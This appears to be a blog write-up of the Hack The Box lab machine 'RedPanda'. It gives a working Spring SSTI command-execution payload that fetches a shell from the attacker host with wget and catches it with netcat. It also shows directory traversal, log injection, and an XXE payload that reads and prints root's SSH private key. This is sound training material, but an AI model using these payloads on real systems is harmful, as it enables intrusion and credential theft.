---
layout: post
title: "HTB: RedPanda"
author: Andrew Cherney
date: 2023-04-20 21:26:28
tags: htb easy-box linux webapp xxe ssti
icon: "assets/icons/redpanda.png"
post_description: "The name of the game for this box is trial and error. RedPanda the search engine for red panda pictures is vulnerable to SSTI. Post user there are two jar files being run which need to be investigated. After understanding how they work the user needs to change image metadata, abuse directory traversal, and use an XXE to get the root ssh key."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/RedPanda]
└──╼ $nmap -sC 10.10.11.170
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-20 21:41 CDT
Nmap scan report for 10.10.11.170
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
```

<h2>Port 8080 - http</h2>

{% include img_link src="/img/redpanda/front_page" alt="front_page" ext="png" trunc=600 %}

Appears we have a search engine which will construct some sort of query to find red panda images based on a provided user input. When I look at the packet in burp suite the only information we pass to the site is a name parameter.

<h1>User as woodenk</h1>

<h2>SSTI</h2>

A bare bones name parameter is passed to the backend code. I'll start with a fuzz of a few things. First this [SSTI payload list](https://github.com/payloadbox/ssti-payloads). Two things happen when I fuzz the name parameter.

#1 There are banned characters such as $ and ~. #2 two payloads return a response which indicated this is vulnerable to SSTI. 

![SSTI test payload](/img/redpanda/SSTI_test_payload.png)

The reason this exploit works in this instance is the web server is using some version of a template engine. That template engine can be used to import local data or run specific code to help render and format pages. When improperly handled user input can reach the code that handles these templates it more often than not leads to RCE. 

Now here comes the complicated part of SSTI: crafting a payload. The two payloads that yielded results were **@(6+5)** **#{7\*7}**. I enumerate further and find that **(6+5)**, **^{7\*7}**, **\*{7\*7}** also work. Here is where I can look around [PayloadAllTheThings SSTI payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java---velocity) for frameworks and basic tests to find what this is running and further develop an exploit. 

After a little bit of manual enumeration I find that this is likely Java - Spring as the provided payload works to run commands. 

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

![SSTI successful test](/img/redpanda/SSTI_success.png)

I'll use a simple shell upload and then run the shell through this exploit.

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.2:8080/shell').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash shell').getInputStream())}
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/RedPanda]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.170] 38572
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
woodenk@redpanda:/tmp/hsperfdata_woodenk$ cat ~/user.txt
cat ~/user.txt
94c2a417e6a574e------------------
```

Oh, I'm already woodenk. I suppose it makes sense that akin to Flask, Spring might not traditionally use www-data. 

<h1>Root</h1>

<h2>Following Groups</h2>

I notice that woodenk is a part of the logs group, and searching for files associated with that group I come across a root directory named **/credits**. Within this directory there are xml files with view totals for the images related to the site, and functionally is used to determine whose images are being viewed the most. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
```

This appears it could be vulnerable to an XML eXternal Entity, or an XXE. The file permissions here are only root can edit these xml files. I'd say there's a good chance that whatever process is updating this is run by root. I cannot edit anything file in this directory however. The location of the images is **/opt/panda_search/src/main/resources/static/img**. I have a hunch that if I look at the metadata they will have an author field set. 

Looking further I see that the panda search jar file is run as root, and is most likely the process controlling these files. I'll quickly download it and sift through what is up with the /credits directory. I spin up a python http server and wget the jar file. 

<h2>Debugging Java</h2>

To sift through these class files inside the jar I used IntelliJ IDEA, you could use VSCode if you install a Java decompiler, or Eclipse. I peruse over to the MainController class file. In here is the bones of what is happening in the Credits directory, and additionally contains woodenk's password for the mysql database and doubles as his machine password: **RedPandazRule**. That password is useless as logging into woodenk this way makes the session not a part of the logs group. 

That jar file contains the code for creating the creds.xml files and assigning the authors, but there is nothing in there to change the scores. 

I decide to use pspy64, a process sniffing tool, to find anything running as a cronjob or as root and hidden from **ps -aux** output. 

```bash
2023/04/23 17:28:01 CMD: UID=0     PID=20784  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
2023/04/23 17:28:01 CMD: UID=0     PID=20783  | /bin/sh /root/run_credits.sh 
```

That is exactly what I was looking for. There is one line of code in a class from this new jar which allows us to smuggle in an XXE: **String xmlPath = "/credits/" + artist + "_creds.xml";**. In this line we see that the defined artist of the image provided is passed unsanitized to create the creds.xml file for a particular artist. This is vulnerable to directory traversal, and hence vulnerable to XXE since I can direct it to the home directory where I can create the .xml file for it to update. 

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>
<credits>
  <author>raccoon</author>
  <image>
    <uri>/../../../../../../../home/woodenk/raccoon.jpg</uri>
    <views>0</views>
    <foo>&xxe;</foo>
  </image>
</credits>
```

The final part of the puzzle here is the log file **/opt/panda_search/redpanda.log** which after a new line appears, it is read and then it reads the image artist and updates the views on the creds file. The file creates logs as such:

```
200||10.10.14.7||Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0||/search
200||10.10.14.7||Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0||/img/greg.jpg
```

I'll change the artist of an image, place it in the home directory, and then inject the log of the view of that image. If this works I should have root's ssh key. 

(Editors note, this needs to be done after gaining a shell through the search engine as woodenk is not a part of the logs group otherwise)

```bash
exiftool -Artist="../home/woodenk/raccoon" raccoon.jpg 
scp raccoon.jpg woodenk@10.10.11.170:.
```

```bash
woodenk@redpanda:~$ echo "200||10.10.14.7||Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0||/../../../../../../home/woodenk/raccoon.jpg" > /opt/panda_search/redpanda.log
woodenk@redpanda:~$ cat raccoon_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>raccoon</author>
  <image>
    <uri>/../../../../../../../home/woodenk/raccoon.jpg</uri>
    <views>0</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
</credits>
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/RedPanda]
└──╼ $ssh root@10.10.11.170 -i root.key 
root@redpanda:~# cat root.txt
f77f9f36------------------------
```

